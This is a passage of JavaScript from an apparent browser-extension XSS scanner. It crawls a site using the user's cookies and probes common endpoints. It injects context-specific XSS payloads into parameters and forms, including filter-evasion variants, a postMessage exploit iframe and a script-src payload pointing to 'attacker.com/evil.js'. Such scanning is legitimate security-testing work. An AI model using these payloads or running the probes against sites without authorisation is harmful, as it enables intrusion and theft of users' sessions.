   * Analyzes page scripts for DOM sinks using location.hash
   */
  async function testHashFragmentXSS(url) {
    const results = [];

    try {
      // Fetch the page and analyze its scripts for hash-based DOM XSS patterns
      const resp = await fetch(url, { credentials: 'include' });
      const html = await resp.text();

      // Extract all script content
      const scriptMatches = html.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
      const allJS = scriptMatches.map(s => s.replace(/<\/?script[^>]*>/gi, '')).join('\n');

      // Dangerous patterns: location.hash flowing to DOM sinks
      const hashSinkPatterns = [
        { regex: /\.innerHTML\s*=\s*[^;]*location\.hash/gi, sink: 'innerHTML' },
        { regex: /\.outerHTML\s*=\s*[^;]*location\.hash/gi, sink: 'outerHTML' },
        { regex: /document\.write\s*\([^)]*location\.hash/gi, sink: 'document.write' },
        { regex: /\$\([^)]*\)\.html\s*\([^)]*location\.hash/gi, sink: 'jQuery.html' },
        { regex: /\.append\s*\([^)]*location\.hash/gi, sink: 'append' },
        { regex: /\.prepend\s*\([^)]*location\.hash/gi, sink: 'prepend' },
        { regex: /eval\s*\([^)]*location\.hash/gi, sink: 'eval' },
        { regex: /setTimeout\s*\([^)]*location\.hash/gi, sink: 'setTimeout' },
        { regex: /setInterval\s*\([^)]*location\.hash/gi, sink: 'setInterval' },
        { regex: /new\s+Function\s*\([^)]*location\.hash/gi, sink: 'Function constructor' },
      ];

      for (const { regex, sink } of hashSinkPatterns) {
        if (regex.test(allJS)) {
          const payload = '<img/onerror=alert(1)src=x>';
          const pocUrl = url.split('#')[0] + '#' + payload;
          results.push({
            type: 'DOM_XSS',
            subtype: 'Hash Fragment to Sink',
            source: 'location.hash',
            sink: sink,
            severity: 'high',
            url: url,
            pocUrl: pocUrl,
            payload: payload,
            proof: {
              patternFound: `location.hash → ${sink}`,
            },
            explanation: `location.hash flows to ${sink} without sanitization.`,
          });
          break; // One finding per page is enough
        }
      }

      // Also check for indirect hash usage via variables
      const hashVarPatterns = [
        /(?:let|const|var)\s+(\w+)\s*=\s*location\.hash/gi,
        /(?:let|const|var)\s+(\w+)\s*=\s*window\.location\.hash/gi,
      ];

      for (const pattern of hashVarPatterns) {
        const matches = [...allJS.matchAll(pattern)];
        for (const match of matches) {
          const varName = match[1];
          // Check if this variable flows to a dangerous sink
          const varToSinkRegex = new RegExp(`\\.innerHTML\\s*=\\s*[^;]*${varName}`, 'gi');
          if (varToSinkRegex.test(allJS)) {
            const payload = '<img/onerror=alert(1)src=x>';
            const pocUrl = url.split('#')[0] + '#' + payload;
            results.push({
              type: 'DOM_XSS',
              subtype: 'Hash Fragment via Variable',
              source: 'location.hash',
              sink: 'innerHTML',
              severity: 'high',
              url: url,
              pocUrl: pocUrl,
              payload: payload,
              proof: {
                variable: varName,
                flow: `location.hash → ${varName} → innerHTML`,
              },
              explanation: `location.hash stored in "${varName}" flows to innerHTML.`,
            });
            break;
          }
        }
      }
    } catch (e) {
      console.log('[XSS Scanner] Hash fragment test error:', e.message);
    }

    return results;
  }

  /**
   * Test for javascript: URL acceptance in redirect parameters
   */
  async function testJavaScriptURLRedirect(url, paramName) {
    const jsPayloads = [
      'javascript:alert(1)',
      'javascript:alert`1`',
      'javascript://comment%0aalert(1)',
      'jAvAsCrIpT:alert(1)',
      'java\tscript:alert(1)',
      'java\nscript:alert(1)',
      '\x00javascript:alert(1)',
    ];

    for (const payload of jsPayloads) {
      try {
        const testUrl = buildTestUrl(url, paramName, payload);
        const resp = await fetch(testUrl, { credentials: 'include', redirect: 'manual' });

        // Check if redirect location contains javascript:
        const redirectLocation = resp.headers.get('location');
        if (redirectLocation && redirectLocation.toLowerCase().includes('javascript:')) {
          const pocUrl = buildTestUrl(url, paramName, payload);
          return {
            type: 'OPEN_REDIRECT_XSS',
            subtype: 'JavaScript URL Redirect',
            parameter: paramName,
            severity: 'high',
            url: url,
            payload: payload,
            pocUrl: pocUrl,
            proof: {
              redirectLocation: redirectLocation,
            },
            explanation: 'Redirect parameter accepts javascript: URLs, enabling XSS via redirect.',
          };
        }

        // Also check if it's reflected in a meta refresh or JS redirect
        if (resp.ok) {
          const html = await resp.text();
          const lowerHtml = html.toLowerCase();

          // Check for javascript: in various reflection points
          if (lowerHtml.includes('javascript:alert')) {
            // Check context
            if (lowerHtml.includes('href="javascript:') ||
                lowerHtml.includes("href='javascript:") ||
                lowerHtml.includes('url=javascript:') ||
                lowerHtml.includes('location=javascript:') ||
                lowerHtml.includes('window.location') && lowerHtml.includes('javascript:')) {
              const pocUrl = buildTestUrl(url, paramName, payload);
              return {
                type: 'OPEN_REDIRECT_XSS',
                subtype: 'JavaScript URL Reflection',
                parameter: paramName,
                severity: 'high',
                url: url,
                payload: payload,
                pocUrl: pocUrl,
                proof: {
                  reflectedIn: 'URL attribute or redirect',
                },
                explanation: 'javascript: URL is reflected in a URL context, enabling XSS.',
              };
            }
          }
        }
      } catch {}
    }

    return null;
  }

  /**
   * Test for PostMessage XSS (missing origin validation)
   */
  async function testPostMessageXSS(url) {
    const results = [];

    try {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      document.body.appendChild(iframe);

      await new Promise((resolve, reject) => {
        iframe.onload = resolve;
        iframe.onerror = reject;
        iframe.src = url;
        setTimeout(reject, 5000);
      });

      // Check if page has message event listeners
      const iframeWindow = iframe.contentWindow;
      if (iframeWindow) {
        // Try to find message handlers in the page's scripts
        const iframeDoc = iframe.contentDocument || iframeWindow.document;
        const scripts = iframeDoc?.querySelectorAll('script') || [];

        for (const script of scripts) {
          const content = script.textContent || '';
          if (content.includes('addEventListener') && content.includes('message')) {
            // Check if it validates origin
            const noOriginCheck = !content.includes('event.origin') && !content.includes('e.origin') &&
                !content.includes('.origin ===') && !content.includes('.origin ==');

            // Check for dangerous sinks
            const dangerousSinks = ['innerHTML', 'outerHTML', 'document.write', 'eval', '.html('];
            for (const sink of dangerousSinks) {
              if (content.includes(sink)) {
                const payload = '<img src=x onerror=alert(1)>';
                results.push({
                  type: 'POSTMESSAGE_XSS',
                  subtype: 'Missing Origin Validation',
                  severity: noOriginCheck ? 'high' : 'medium',
                  url: url,
                  payload: payload,
                  pocUrl: url,
                  pocHtml: `<iframe src="${url}" onload="this.contentWindow.postMessage('${payload}','*')"></iframe>`,
                  sink: sink,
                  proof: {
                    hasMessageHandler: true,
                    checksOrigin: !noOriginCheck,
                    dangerousSink: sink,
                  },
                  explanation: noOriginCheck
                    ? `postMessage handler uses ${sink} without origin validation. XSS via cross-origin message.`
                    : `postMessage handler uses ${sink}. Origin validation may be bypassable.`,
                });
                break;
              }
            }
          }
        }
      }

      document.body.removeChild(iframe);
    } catch (e) {
      console.log('[XSS Scanner] PostMessage test error:', e.message);
    }

    return results;
  }

  // ============================================
  // SITE CRAWLER & ENDPOINT DISCOVERY
  // ============================================

  /**
   * Extract all endpoints from HTML content
   */
  function extractEndpointsFromHtml(html, baseUrl) {
    const endpoints = new Set();
    const origin = new URL(baseUrl).origin;
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    // Extract links from <a> tags
    doc.querySelectorAll('a[href]').forEach(el => {
      const href = el.getAttribute('href');
      if (href) {
        try {
          const url = new URL(href, baseUrl);
          if (url.origin === origin && !href.startsWith('javascript:') && !href.startsWith('#')) {
            endpoints.add(url.pathname + url.search);
          }
        } catch {}
      }
    });

    // Extract form actions
    doc.querySelectorAll('form[action]').forEach(el => {
      const action = el.getAttribute('action');
      if (action) {
        try {
          const url = new URL(action, baseUrl);
          if (url.origin === origin) {
            endpoints.add(url.pathname + url.search);
          }
        } catch {}
      }
    });

    // Extract from area tags (image maps)
    doc.querySelectorAll('area[href]').forEach(el => {
      const href = el.getAttribute('href');
      if (href) {
        try {
          const url = new URL(href, baseUrl);
          if (url.origin === origin) {
            endpoints.add(url.pathname + url.search);
          }
        } catch {}
      }
    });

    // Extract URLs from inline scripts (API endpoints, etc.)
    doc.querySelectorAll('script:not([src])').forEach(script => {
      const content = script.textContent;
      // Match URL patterns in JS
      const urlPatterns = [
        /["'`](\/[a-z0-9\/_\-\.]+(?:\?[^"'`\s]*)?)/gi,
        /["'`](\/api\/[^"'`\s]+)/gi,
        /fetch\s*\(\s*["'`](\/[^"'`]+)/gi,
        /href\s*[:=]\s*["'`](\/[^"'`]+)/gi,
        /action\s*[:=]\s*["'`](\/[^"'`]+)/gi,
        /url\s*[:=]\s*["'`](\/[^"'`]+)/gi,
        /\.get\s*\(\s*["'`](\/[^"'`]+)/gi,
        /\.post\s*\(\s*["'`](\/[^"'`]+)/gi,
        /XMLHttpRequest[^;]*["'`](\/[^"'`]+)/gi,
        /endpoint\s*[:=]\s*["'`](\/[^"'`]+)/gi,
        /path\s*[:=]\s*["'`](\/[^"'`]+)/gi,
        /route\s*[:=]\s*["'`](\/[^"'`]+)/gi,
      ];

      for (const pattern of urlPatterns) {
        let match;
        while ((match = pattern.exec(content)) !== null) {
          const path = match[1];
          if (path && path.startsWith('/') && !path.includes('//')) {
            endpoints.add(path);
          }
        }
      }
    });

    // Also extract from onclick and other event handlers
    doc.querySelectorAll('[onclick], [onsubmit], [onload]').forEach(el => {
      const handlers = [
        el.getAttribute('onclick'),
        el.getAttribute('onsubmit'),
        el.getAttribute('onload'),
      ].filter(Boolean);

      for (const handler of handlers) {
        const matches = handler.match(/["'`](\/[a-z0-9\/_\-\.]+[^"'`]*)/gi);
        if (matches) {
          matches.forEach(m => {
            const path = m.slice(1, -1) || m.slice(1);
            if (path.startsWith('/')) endpoints.add(path);
          });
        }
      }
    });

    // Extract from data attributes
    doc.querySelectorAll('[data-url], [data-href], [data-src], [data-endpoint], [data-action]').forEach(el => {
      ['data-url', 'data-href', 'data-src', 'data-endpoint', 'data-action'].forEach(attr => {
        const val = el.getAttribute(attr);
        if (val && val.startsWith('/')) {
          endpoints.add(val);
        }
      });
    });

    // Extract from meta refresh
    doc.querySelectorAll('meta[http-equiv="refresh"]').forEach(meta => {
      const content = meta.getAttribute('content');
      if (content) {
        const urlMatch = content.match(/url=(.+)/i);
        if (urlMatch) {
          try {
            const url = new URL(urlMatch[1], baseUrl);
            if (url.origin === origin) {
              endpoints.add(url.pathname + url.search);
            }
          } catch {}
        }
      }
    });

    return [...endpoints];
  }

  /**
   * Crawl the site starting from current page
   */
  async function crawlSite(maxDepth = 2, maxPages = 50) {
    const origin = location.origin;
    const visited = new Set();
    const discovered = new Map(); // path -> {url, depth, params}
    const queue = [{ url: location.href, depth: 0 }];

    console.log(`[XSS Crawler] Starting crawl from ${location.href} (max depth: ${maxDepth}, max pages: ${maxPages})`);

    while (queue.length > 0 && visited.size < maxPages) {
      const { url, depth } = queue.shift();

      // Normalize URL (remove hash, trailing slash)
      let normalizedPath;
      try {
        const parsed = new URL(url);
        normalizedPath = parsed.pathname.replace(/\/$/, '') || '/';
        if (parsed.search) normalizedPath += parsed.search;
      } catch {
        continue;
      }

      if (visited.has(normalizedPath)) continue;
      visited.add(normalizedPath);

      console.log(`[XSS Crawler] Crawling: ${normalizedPath} (depth: ${depth})`);

      try {
        const resp = await fetch(url, { credentials: 'include' });
        if (!resp.ok) continue;

        const contentType = resp.headers.get('content-type') || '';
        if (!contentType.includes('text/html')) continue;

        const html = await resp.text();

        // Store this endpoint with form data
        const parsedUrl = new URL(url);
        const params = Array.from(parsedUrl.searchParams.keys());

        // Extract form inputs from this page
        const formInputs = extractFormInputsFromHtml(html);
        const formParams = formInputs.map(f => f.name);

        discovered.set(normalizedPath, {
          url: url,
          path: parsedUrl.pathname,
          params: params,
          formInputs: formInputs,
          formParams: formParams,
          depth: depth,
        });

        if (formInputs.length > 0) {
          console.log(`[XSS Crawler] Found ${formInputs.length} form inputs on ${normalizedPath}`);
        }

        // Extract new endpoints if not at max depth
        if (depth < maxDepth) {
          const endpoints = extractEndpointsFromHtml(html, url);
          for (const endpoint of endpoints) {
            const fullUrl = origin + endpoint;
            const endpointPath = endpoint.split('?')[0].replace(/\/$/, '') || '/';

            if (!visited.has(endpoint) && !visited.has(endpointPath)) {
              queue.push({ url: fullUrl, depth: depth + 1 });
            }
          }
        }
      } catch (e) {
        console.log(`[XSS Crawler] Error fetching ${url}:`, e.message);
      }
    }

    console.log(`[XSS Crawler] Crawl complete. Discovered ${discovered.size} endpoints.`);
    return discovered;
  }

  /**
   * Extract form inputs from HTML content
   */
  function extractFormInputsFromHtml(html) {
    const inputs = [];
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    // Get all forms
    doc.querySelectorAll('form').forEach(form => {
      const formAction = form.getAttribute('action') || '';
      const formMethod = (form.getAttribute('method') || 'GET').toUpperCase();

      form.querySelectorAll('input[name], textarea[name], select[name]').forEach(input => {
        const name = input.getAttribute('name');
        const type = input.getAttribute('type') || 'text';
        if (name && !['submit', 'button', 'image', 'reset'].includes(type)) {
          inputs.push({
            name,
            type,
            formAction,
            formMethod,
          });
        }
      });
    });

    // Also extract input names from anywhere (might be used via JS)
    doc.querySelectorAll('input[name], textarea[name]').forEach(input => {
      const name = input.getAttribute('name');
      if (name && !inputs.some(i => i.name === name)) {
        inputs.push({ name, type: 'text', formAction: '', formMethod: 'GET' });
      }
    });

    return inputs;
  }

  /**
   * Test a single endpoint for XSS (with all its parameters)
   * Enhanced: Uses full COMMON_PARAMS list and extracts form inputs
   */
  async function testEndpointForXSS(endpoint, testedParams) {
    const results = [];
    const { url, path, params } = endpoint;

    // Fetch the page to extract forms
    let pageHtml = '';
    let formInputs = [];
    try {
      const pageResp = await fetch(url, { credentials: 'include' });
      if (pageResp.ok) {
        pageHtml = await pageResp.text();
        formInputs = extractFormInputsFromHtml(pageHtml);
        console.log(`[XSS Scanner] Found ${formInputs.length} form inputs on ${path}`);
      }
    } catch {}

    // URL-like parameter names that should be tested for javascript: URL injection
    const urlParamNames = ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest', 'target',
                           'link', 'redir', 'from', 'ref', 'src', 'href', 'uri', 'path', 'callback'];

    // Test existing URL parameters
    for (const param of params) {
      const paramName = typeof param === 'object' ? param.name : param;
      if (testedParams.has(`${path}:${paramName}`)) continue;
      testedParams.add(`${path}:${paramName}`);

      console.log(`[XSS Scanner] Testing ${path}?${paramName}=...`);
      const vuln = await testParameterFull(url, paramName, 'test');
      if (vuln) {
        vuln.crawledPath = path;
        results.push(vuln);
        reportFinding(vuln);
      }

      // Test URL-like params for javascript: URL injection
      if (urlParamNames.includes(paramName.toLowerCase())) {
        const jsVuln = await testJavaScriptURLRedirect(url, paramName);
        if (jsVuln) {
          jsVuln.crawledPath = path;
          results.push(jsVuln);
          reportFinding(jsVuln);
        }
      }

      // Test BBCode-like params for javascript: URL in BBCode
      const bbVuln = await testBBCodeInjection(url, paramName);
      if (bbVuln) {
        bbVuln.crawledPath = path;
        results.push(bbVuln);
        reportFinding(bbVuln);
      }
    }

    // Test form inputs found on the page
    const postFormInputs = formInputs.filter(f => f.formMethod === 'POST');
    const getFormInputs = formInputs.filter(f => f.formMethod === 'GET');

    // Test GET form inputs
    for (const input of getFormInputs) {
      if (testedParams.has(`${path}:${input.name}`)) continue;
      testedParams.add(`${path}:${input.name}`);

      console.log(`[XSS Scanner] Testing form input: ${input.name} (${input.formMethod})`);

      const testUrl = new URL(url);
      testUrl.searchParams.set(input.name, 'FORMTEST');
      const vuln = await testParameterFull(testUrl.toString(), input.name, 'FORMTEST');
      if (vuln) {
        vuln.crawledPath = path;
        vuln.fromForm = true;
        results.push(vuln);
        reportFinding(vuln);
      }
    }

    // Test POST form inputs with actual payload submission
    if (postFormInputs.length > 0) {
      console.log(`[XSS Scanner] Testing ${postFormInputs.length} POST form inputs on ${path}`);
      const postVulns = await testPOSTFormXSS(endpoint.formAction || url, postFormInputs, url);
      for (const vuln of postVulns) {
        vuln.crawledPath = path;
        results.push(vuln);
        reportFinding(vuln);
      }
    }

    // Probe with FULL COMMON_PARAMS list (not just quick list)
    // Batch probe for efficiency - 10 params at a time
    const paramsToProbe = COMMON_PARAMS.filter(p =>
      !params.includes(p) &&
      !formInputs.some(f => f.name === p) &&
      !testedParams.has(`${path}:${p}`)
    );

    console.log(`[XSS Scanner] Probing ${paramsToProbe.length} common params on ${path}`);

    for (let i = 0; i < paramsToProbe.length; i += 10) {
      const batch = paramsToProbe.slice(i, i + 10);

      const probeResults = await Promise.all(batch.map(async param => {
        const canary = 'CRL' + Math.random().toString(36).substring(2, 6);
        const testUrl = new URL(url);
        testUrl.searchParams.set(param, canary);

        try {
          const resp = await fetch(testUrl.toString(), { credentials: 'include' });
          if (resp.ok) {
            const html = await resp.text();
            if (html.includes(canary)) {
              return { param, canary, testUrl: testUrl.toString() };
            }
          }
        } catch {}
        return null;
      }));

      // Test any that reflected
      for (const result of probeResults) {
        if (!result) continue;

        testedParams.add(`${path}:${result.param}`);
        console.log(`[XSS Scanner] Found reflection: ${path}?${result.param}=`);

        const vuln = await testParameterFull(result.testUrl, result.param, result.canary);
        if (vuln) {
          vuln.crawledPath = path;
          vuln.discoveredParam = true;
          results.push(vuln);
          reportFinding(vuln);
        }
      }
    }

    return results;
  }

  /**
   * Get intercepted endpoints from content.js (for SPAs)
   */
  async function getInterceptedEndpoints() {
    return new Promise((resolve) => {
      const requestId = 'xss_' + Math.random().toString(36).substring(2, 10);
      const timeout = setTimeout(() => {
        window.removeEventListener('message', handler);
        resolve([]);
      }, 2000);

      const handler = (event) => {
        if (event.source !== window) return;
        if (event.data?.type === '__lonkero_endpoints_response__' && event.data.requestId === requestId) {
          clearTimeout(timeout);
          window.removeEventListener('message', handler);
          resolve(event.data.endpoints || []);
        }
      };

      window.addEventListener('message', handler);
      window.postMessage({ type: '__lonkero_get_endpoints__', requestId }, '*');
    });
  }

  /**
   * Deep scan: Crawl site and test all discovered endpoints
   * Enhanced: Also uses intercepted endpoints for SPA support
   */
  async function deepScan(options = {}) {
    const { maxDepth = 2, maxPages = 50 } = options;

    console.log('[XSS Scanner] Starting DEEP SCAN (crawl + test all endpoints)...');
    const allResults = [];
    const testedParams = new Set();

    // Phase 0: Get intercepted endpoints (for SPAs/GraphQL)
    console.log('[XSS Scanner] Phase 0: Getting intercepted endpoints (SPA support)...');
    const interceptedEndpoints = await getInterceptedEndpoints();
    console.log(`[XSS Scanner] Got ${interceptedEndpoints.length} intercepted endpoints`);

    // Phase 1: Crawl the site (traditional HTML)
    console.log('[XSS Scanner] Phase 1: Crawling site...');
    const discovered = await crawlSite(maxDepth, maxPages);

    // Merge intercepted endpoints into discovered
    const origin = location.origin;
    for (const endpoint of interceptedEndpoints) {
      try {
        // Endpoints come as objects: { url, path, method, ... }
        const endpointUrl = typeof endpoint === 'string' ? endpoint : (endpoint.url || endpoint.path);
        if (!endpointUrl) {
          console.log(`[XSS Scanner] Skipping invalid endpoint:`, endpoint);
          continue;
        }

        // Parse the intercepted endpoint URL
        const url = new URL(endpointUrl, origin);
        if (url.origin !== origin) continue; // Skip cross-origin

        const normalizedPath = url.pathname.replace(/\/$/, '') || '/';
        const pathWithQuery = normalizedPath + (url.search || '');

        if (!discovered.has(pathWithQuery) && !discovered.has(normalizedPath)) {
          const params = Array.from(url.searchParams.keys());
          discovered.set(pathWithQuery, {
            url: url.toString(),
            path: normalizedPath,
            params: params,
            formInputs: [],
            formParams: [],
            depth: 0,
            source: 'intercepted',
            method: endpoint.method || 'GET',
            isGraphQL: endpoint.isGraphQL || false,
          });
          console.log(`[XSS Scanner] Added intercepted endpoint: ${pathWithQuery} (${endpoint.method || 'GET'})`);
        }
      } catch (e) {
        console.log(`[XSS Scanner] Could not parse intercepted endpoint:`, endpoint, e.message);
      }
    }

    // Phase 1.5: Probe for common API endpoints that might not be linked
    console.log('[XSS Scanner] Phase 1.5: Probing common API/XSS endpoints...');
    const basePath = new URL(location.href).pathname.replace(/\/[^/]*$/, '') || '';

    // Common API paths
    const apiPaths = [
      '/api/stats', '/api/user', '/api/data', '/api/search', '/api/config',
      '/api/callback', '/api/jsonp', '/api/v1/stats', '/api/v1/user',
      `${basePath}/api/stats`, `${basePath}/api/data`,
      '/feed.xml', '/rss.xml', '/sitemap.xml',
      `${basePath}/feed.xml`, `${basePath}/stats`,
    ];

    // Common XSS-prone endpoints with their typical parameters
    const xssPaths = [
      { path: `${basePath}/error`, params: ['from', 'msg', 'message', 'error', 'redirect', 'url', 'return'] },
      { path: `${basePath}/embed`, params: ['title', 'url', 'src', 'content', 'html'] },
      { path: `${basePath}/print`, params: ['header', 'title', 'footer', 'content', 'id'] },
      { path: `${basePath}/share`, params: ['title', 'url', 'text', 'description'] },
      { path: `${basePath}/postmessage`, params: [] }, // PostMessage XSS - no params needed
      { path: `${basePath}/redirect`, params: ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest'] },
      { path: `${basePath}/callback`, params: ['callback', 'cb', 'jsonp', 'func'] },
      { path: `${basePath}/download`, params: ['file', 'name', 'filename'] },
      { path: `${basePath}/export`, params: ['format', 'filename', 'title'] },
      { path: `${basePath}/debug`, params: ['cmd', 'exec', 'code', 'eval'] },
      { path: `${basePath}/log`, params: ['msg', 'message', 'data', 'event'] },
      { path: `${basePath}/upload`, params: ['name', 'filename', 'title'] },
      { path: `${basePath}/avatar`, params: ['url', 'src', 'image'] },
      { path: `${basePath}/import`, params: ['url', 'data', 'source'] },
      { path: `${basePath}/contact`, params: ['name', 'email', 'subject', 'message'] },
    ];

    for (const apiPath of apiPaths) {
      if (discovered.has(apiPath)) continue;

      try {
        // Quick check if endpoint exists
        const testUrl = new URL(apiPath, origin);
        const resp = await fetch(testUrl.toString(), { credentials: 'include', method: 'HEAD' });

        if (resp.ok || resp.status === 405) { // 405 = method not allowed but endpoint exists
          discovered.set(apiPath, {
            url: testUrl.toString(),
            path: apiPath,
            params: [],
            formInputs: [],
            formParams: [],
            depth: 0,
            source: 'api-probe',
          });
          console.log(`[XSS Scanner] Found API endpoint: ${apiPath}`);
        }
      } catch {}
    }

    // Probe XSS-prone endpoints with their typical parameters
    for (const { path: xssPath, params: xssParams } of xssPaths) {
      if (discovered.has(xssPath)) continue;

      try {
        const testUrl = new URL(xssPath, origin);
        const resp = await fetch(testUrl.toString(), { credentials: 'include', method: 'HEAD' });

        if (resp.ok || resp.status === 405) {
          // Build URL with test parameters for reflection testing
          const urlWithParams = new URL(xssPath, origin);
          xssParams.forEach(p => urlWithParams.searchParams.set(p, 'test'));

          discovered.set(xssPath, {
            url: urlWithParams.toString(),
            path: xssPath,
            params: xssParams.map(p => ({ name: p, value: 'test' })),
            formInputs: [],
            formParams: [],
            depth: 0,
            source: 'xss-probe',
          });
          console.log(`[XSS Scanner] Found XSS endpoint: ${xssPath} (params: ${xssParams.join(', ')})`);
        }
      } catch {}
    }

    console.log(`[XSS Scanner] Found ${discovered.size} unique endpoints to test (crawled + intercepted + probed)`);

    // Phase 2: Test each endpoint
    console.log('[XSS Scanner] Phase 2: Testing discovered endpoints...');
    let tested = 0;
    for (const [path, endpoint] of discovered) {
      tested++;
      console.log(`[XSS Scanner] Testing endpoint ${tested}/${discovered.size}: ${path}`);

      const results = await testEndpointForXSS(endpoint, testedParams);
      allResults.push(...results);
    }

    // Phase 3: DOM XSS on current page
    console.log('[XSS Scanner] Phase 3: DOM XSS analysis...');
    const domVulns = analyzeDOM_XSS();
    for (const vuln of domVulns) {
      // Build POC URL based on source type
      let pocUrl = location.href;
      if (vuln.source === 'location.hash') {
        pocUrl = location.origin + location.pathname + location.search + '#<img src=x onerror=alert(1)>';
      } else if (vuln.source === 'location.search') {
        const testUrl = new URL(location.href);
        testUrl.searchParams.set('xss', '<img src=x onerror=alert(1)>');
        pocUrl = testUrl.toString();
      }

      const finding = {
        type: 'DOM_XSS',
        severity: 'high',
        url: location.href,
        pocUrl: pocUrl,
        source: vuln.source,
        sink: vuln.sinkName,
        evidence: vuln.evidence,
        code: vuln.code,
        payload: '<img src=x onerror=alert(1)>',
        explanation: `Tainted data from ${vuln.source} flows to dangerous sink ${vuln.sinkName}`,
      };
      allResults.push(finding);
      reportFinding(finding);
    }

    // Phase 4: Hash-based XSS check on current page
    if (location.hash) {
      checkHashXSS(location.hash);
    }

    // Phase 5: Active hash fragment XSS testing
    console.log('[XSS Scanner] Phase 5: Hash fragment reflection testing...');
    try {
      const hashResults = await testHashFragmentXSS(location.href);
      for (const vuln of hashResults) {
        allResults.push(vuln);
        reportFinding(vuln);
      }
    } catch (e) {
      console.log('[XSS Scanner] Hash fragment test error:', e.message);
    }

    // Phase 6: PostMessage XSS testing on discovered endpoints
    console.log('[XSS Scanner] Phase 6: PostMessage XSS testing...');
    const postMessageEndpoints = [...discovered.values()].filter(e =>
      e.path.includes('postmessage') || e.path.includes('message') || e.path.includes('widget')
    );
    for (const endpoint of postMessageEndpoints) {
      try {
        const pmResults = await testPostMessageXSS(endpoint.url);
        for (const vuln of pmResults) {
          allResults.push(vuln);
          reportFinding(vuln);
        }
      } catch (e) {
        console.log('[XSS Scanner] PostMessage test error:', e.message);
      }
    }

    // Phase 7: JavaScript URL redirect testing
    console.log('[XSS Scanner] Phase 7: JavaScript URL redirect testing...');
    const redirectEndpoints = [...discovered.values()].filter(e =>
      e.path.includes('redirect') || e.path.includes('goto') || e.path.includes('return') ||
      e.path.includes('next') || e.path.includes('url') || e.path.includes('callback')
    );
    for (const endpoint of redirectEndpoints) {
      const redirectParams = ['url', 'to', 'next', 'return', 'redirect', 'goto', 'dest', 'target', 'link', 'redir'];
      for (const param of redirectParams) {
        if (testedParams.has(`${endpoint.path}:${param}:jsurl`)) continue;
        testedParams.add(`${endpoint.path}:${param}:jsurl`);

        try {
          const jsResult = await testJavaScriptURLRedirect(endpoint.url, param);
          if (jsResult) {
            allResults.push(jsResult);
            reportFinding(jsResult);
          }
        } catch {}
      }
    }

    // Count sources
    const interceptedCount = [...discovered.values()].filter(e => e.source === 'intercepted').length;
    const crawledCount = discovered.size - interceptedCount;

    console.log(`[XSS Scanner] DEEP SCAN complete. Found ${allResults.length} vulnerabilities across ${discovered.size} endpoints (${crawledCount} crawled, ${interceptedCount} intercepted).`);

    window.postMessage({
      type: '__lonkero_xss_deep_scan_complete__',
      findings: allResults,
      endpointsCrawled: crawledCount,
      endpointsIntercepted: interceptedCount,
      totalEndpoints: discovered.size,
      paramsTestedCount: testedParams.size,
    }, '*');

    return {
      findings: allResults,
      endpoints: [...discovered.entries()].map(([path, data]) => ({ path, ...data })),
      stats: {
        endpointsCrawled: crawledCount,
        endpointsIntercepted: interceptedCount,
        totalEndpoints: discovered.size,
        paramsTested: testedParams.size,
        vulnerabilitiesFound: allResults.length,
      },
    };
  }

  // ============================================
  // UTILITIES
  // ============================================

  function buildTestUrl(baseUrl, paramName, payload) {
    const url = new URL(baseUrl);
    url.searchParams.set(paramName, payload);
    return url.toString();
  }

  function getContextName(context) {
    const names = {
      [CONTEXTS.HTML_BODY]: 'HTML Body',
      [CONTEXTS.HTML_ATTR_DOUBLE]: 'HTML Attribute (double-quoted)',
      [CONTEXTS.HTML_ATTR_SINGLE]: 'HTML Attribute (single-quoted)',
      [CONTEXTS.HTML_ATTR_UNQUOTED]: 'HTML Attribute (unquoted)',
      [CONTEXTS.HTML_COMMENT]: 'HTML Comment',
      [CONTEXTS.JS_STRING_DOUBLE]: 'JavaScript String (double-quoted)',
      [CONTEXTS.JS_STRING_SINGLE]: 'JavaScript String (single-quoted)',
      [CONTEXTS.JS_TEMPLATE]: 'JavaScript Template Literal',
      [CONTEXTS.JS_CODE]: 'JavaScript Code',
      [CONTEXTS.EVENT_HANDLER]: 'Event Handler',
      [CONTEXTS.JAVASCRIPT_URL]: 'JavaScript URL',
      [CONTEXTS.URL_CONTEXT]: 'URL Context',
      [CONTEXTS.CSS_VALUE]: 'CSS Value',
      [CONTEXTS.STYLE_TAG]: 'Style Tag',
      [CONTEXTS.SCRIPT_SRC]: 'Script src',
      [CONTEXTS.DATA_ATTRIBUTE]: 'Data Attribute',
    };
    return names[context] || 'Unknown';
  }

  function getExploitPayload(context) {
    const payloads = {
      [CONTEXTS.HTML_BODY]: '<img src=x onerror=alert(document.domain)>',
      [CONTEXTS.HTML_ATTR_DOUBLE]: '"><img src=x onerror=alert(document.domain)>',
      [CONTEXTS.HTML_ATTR_SINGLE]: "'><img src=x onerror=alert(document.domain)>",
      [CONTEXTS.HTML_ATTR_UNQUOTED]: ' onfocus=alert(document.domain) autofocus ',
      [CONTEXTS.JS_STRING_DOUBLE]: '";alert(document.domain);//',
      [CONTEXTS.JS_STRING_SINGLE]: "';alert(document.domain);//",
      [CONTEXTS.JS_TEMPLATE]: '`;alert(document.domain);//',
      [CONTEXTS.JS_CODE]: ';alert(document.domain);//',
      [CONTEXTS.EVENT_HANDLER]: "'-alert(document.domain)-'",
      [CONTEXTS.JAVASCRIPT_URL]: 'alert(document.domain)',
      [CONTEXTS.HTML_COMMENT]: '--><script>alert(document.domain)</script><!--',
      [CONTEXTS.STYLE_TAG]: '</style><script>alert(document.domain)</script>',
      [CONTEXTS.SCRIPT_SRC]: '//attacker.com/evil.js',
    };
    return payloads[context] || '<script>alert(document.domain)</script>';
  }

  function getExplanation(context, escaping) {
    const contextName = getContextName(context);
    const unesc = escaping.unescapedChars.join(', ') || 'none detected';

    const explanations = {
      [CONTEXTS.HTML_BODY]: `Reflects in HTML body without escaping < and >. Unescaped: ${unesc}`,
      [CONTEXTS.HTML_ATTR_DOUBLE]: `Reflects in double-quoted attribute without escaping ". Unescaped: ${unesc}`,
      [CONTEXTS.HTML_ATTR_SINGLE]: `Reflects in single-quoted attribute without escaping '. Unescaped: ${unesc}`,
      [CONTEXTS.HTML_ATTR_UNQUOTED]: `Reflects in unquoted attribute - space breaks out. Unescaped: ${unesc}`,
